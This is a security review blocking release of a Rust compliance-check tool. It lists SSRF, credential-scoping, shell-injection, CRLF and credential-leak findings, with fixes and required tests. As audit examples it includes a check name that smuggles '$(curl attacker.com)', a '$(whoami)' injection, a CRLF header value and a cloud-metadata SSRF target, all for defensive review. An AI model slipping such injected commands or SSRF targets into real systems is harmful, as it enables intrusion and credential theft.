# Security Review: OCEAN Phase 1-3 Implementation

**Owner:** CISO
**Status:** BLOCKED — Critical findings require remediation
**Date:** 2026-03-28
**Scope:** Commits GRC-28 through GRC-33 (check interpreter, HTH absorption, codegen, SARIF, attestation removal)
**Related:** Threat Model (`threat-model-unified-check-architecture.md`), ADR-001

---

## Verdict: NOT APPROVED FOR RELEASE

7 critical/high findings mapped to threat model mitigations that are **not implemented**. Implementation must address P0 mitigations before any public release.

---

## Finding Summary

| # | Finding | Severity | Threat Model Ref | Status |
|---|---------|----------|-------------------|--------|
| F1 | No SSRF protection in check interpreter | **CRITICAL** | M1, M2 | Not mitigated |
| F2 | Credentials sent to arbitrary URLs | **CRITICAL** | M3 | Not mitigated |
| F3 | Shell injection in generated code packs | **CRITICAL** | M12 | Not mitigated |
| F4 | No input sanitization (CRLF, URL encoding) | **HIGH** | M8, M9, M11 | Not mitigated |
| F5 | Credentials exposed in error messages | **HIGH** | M15, M16 | Not mitigated |
| F6 | REST API binds to 0.0.0.0 by default | **HIGH** | M19 | Not mitigated |
| F7 | YAML parsing has no size/depth limits | **MEDIUM** | M5 | Not mitigated |
| F8 | Raw API data stored without automatic redaction | **MEDIUM** | M17 | Partial (optional) |
| F9 | No CORS configuration on REST API | **MEDIUM** | M22 | Not configured |
| F10 | Template variables not rendered in code packs | **MEDIUM** | — | Bug (non-security) |

### Controls Passing

| Control | Threat Model Ref | Status |
|---------|-------------------|--------|
| Remediation defaults to dry-run (`--apply` flag) | M4 | **PASS** |
| Safety gates for active tests (4-level classification) | M27 | **PASS** |
| Credentials referenced via env vars in code packs | M18 | **PASS** |
| Templates bundled at compile time | M13 | **PASS** |
| `cargo audit` in CI | M23 | **PASS** |
| `Cargo.lock` committed | M24 | **PASS** |

---

## Detailed Findings

### F1: No SSRF Protection in Check Interpreter (CRITICAL)

**Location:** `src/check/interpreter.rs` — `execute_step()` function

**Issue:** The interpreter sends HTTP requests to any URL specified in `.check.yaml` with zero validation. A malicious check can target:
- AWS metadata (169.254.169.254)
- Internal services on RFC 1918 ranges
- Localhost services
- File protocol (`file://`)

**Required fix (M1 + M2):**
1. Implement URL allowlist per source system (e.g., `source: github` → only `https://api.github.com/*`)
2. Block RFC 1918, link-local, localhost, and cloud metadata endpoints
3. Validate URL scheme (HTTPS only, no `file://`, `gopher://`, etc.)
4. Resolve DNS and verify IP address is not in blocked ranges (DNS rebinding protection)

---

### F2: Credentials Sent to Arbitrary URLs (CRITICAL)

**Location:** `src/check/interpreter.rs` — `build_input_context()`, `resolve_headers()`

**Issue:** All credentials in the context are available to all HTTP requests regardless of destination URL. A `source: github` check with `GITHUB_TOKEN` in its credentials block can send that token to any URL.

**Required fix (M3):**
1. Enforce that credentials declared in `credentials:` are only injected into requests matching the source system's URL allowlist
2. Validate at check load time that `steps[].request.url` matches the declared `source`

---

### F3: Shell Injection in Generated Code Packs (CRITICAL)

**Location:** `src/codegen/mod.rs` — all embedded Handlebars templates

**Issue:** Check metadata (name, description, header values) is interpolated into bash scripts using Handlebars HTML escaping, which is insufficient for shell safety. A malicious check with `name: "Test $(curl attacker.com)"` produces exploitable output.

**Required fix (M12):**
1. Register a custom Handlebars escape function that performs shell-safe escaping (single-quote wrapping with `'\''` for embedded quotes)
2. Use `{{{triple_stache}}}` only for values already validated as shell-safe
3. Add unit tests with adversarial check names/descriptions containing shell metacharacters

---

### F4: No Input Sanitization (HIGH)

**Location:** `src/check/interpreter.rs` — `resolve_template()`

**Issue:** Template variables are inserted via naive string replacement with no sanitization:
- **CRLF injection** in headers: value with `\r\n` creates header injection
- **URL parameter injection**: value with `&force=true` appends unintended parameters
- **No URL encoding** of interpolated values

**Required fix (M8 + M9 + M11):**
1. Validate input values against expected patterns (alphanumeric + hyphens for org names)
2. URL-encode values interpolated into URLs (use the `url` crate)
3. Strip or reject CRLF sequences in header values
4. Reject null bytes in all inputs

---

### F5: Credentials Exposed in Error Messages (HIGH)

**Location:** `src/check/interpreter.rs` line ~169, `src/harden/mod.rs` line ~280

**Issue:** HTTP errors from `ureq` are propagated directly into `anyhow!` errors, potentially including the full request URL with query parameters and Authorization headers. The harden module also returns URLs in success messages without redacting embedded credentials.

**Required fix (M15 + M16):**
1. Wrap `ureq` errors to strip headers and credential values before surfacing
2. Use `secrecy::SecretString` for all credential values throughout the interpreter and harden engine (not just in `github_common.rs`)
3. Implement a tracing layer that redacts known token patterns (`ghp_*`, `AKIA*`, `ssws_*`, `Bearer .*`)

---

### F6: REST API Binds to 0.0.0.0 by Default (HIGH)

**Location:** `src/api/server.rs` line 32

**Issue:** `ocean serve` binds to `0.0.0.0:8080`, exposing the API on all network interfaces. Authentication is optional (requires `--auth-token` flag).

**Required fix (M19 + M20):**
1. Default bind address to `127.0.0.1`
2. Require `--bind 0.0.0.0` for explicit external exposure
3. When binding to non-localhost, require `--auth-token` (refuse to start without authentication on external interfaces)

---

### F7: YAML Parsing Has No Size/Depth Limits (MEDIUM)

**Location:** `src/check/loader.rs`, `src/config/loader.rs`

**Issue:** `serde_yaml::from_str()` is called with no size limits on input files. Potential for YAML bombs (billion laughs) or deeply nested structures causing excessive memory/CPU usage.

**Required fix (M5):**
1. Check file size before parsing (reject > 1MB for check files, > 64KB for config)
2. Validate against JSON Schema before YAML interpretation (already planned)

---

### F8: Raw API Data Stored Without Automatic Redaction (MEDIUM)

**Location:** `src/storage/sqlite.rs` — `raw_data` column

**Issue:** The `raw_data` field stores raw API responses which could contain tokens, PII, or session data. Redaction exists (`src/evidence/redaction.rs`) but is optional.

**Required fix (M17):**
1. Enable redaction by default (opt-out, not opt-in)
2. Strip Authorization headers and known credential patterns from raw_data before storage
3. At minimum, never store request headers in evidence — only store response bodies

---

### F9: No CORS Configuration (MEDIUM)

**Location:** `src/api/handlers.rs`

**Issue:** No CORS headers configured on the axum router.

**Required fix (M22):**
1. Add `tower-http::cors::CorsLayer` with restrictive defaults (no allowed origins)
2. If CORS is needed, require explicit origin allowlist via config

---

## Remediation Priority

### Before any public release (P0):
- F1: SSRF protection
- F2: Credential scoping
- F3: Shell injection in codegen
- F4: Input sanitization
- F5: Credential redaction in errors
- F6: API bind address

### Before community check contributions (P1):
- F7: YAML parsing limits
- F8: Evidence redaction defaults
- F9: CORS configuration

---

## Security Test Requirements

QA must verify these before Stage 7 gate passes:

1. **SSRF test**: Create a check targeting `http://169.254.169.254/` — must be rejected
2. **Credential scoping test**: Create a `source: github` check sending `GITHUB_TOKEN` to a non-GitHub URL — must be rejected
3. **Shell injection test**: Create a check with `name: "$(whoami)"` — generated bash must not execute it
4. **CRLF test**: Set input value containing `\r\nX-Injected: true` — must be rejected or stripped
5. **Harden dry-run test**: Run `ocean harden` without `--apply` — must not make API calls
6. **API binding test**: Start `ocean serve` with defaults — must bind to 127.0.0.1 only
7. **Error redaction test**: Trigger an HTTP error with credentials in context — error message must not contain token values
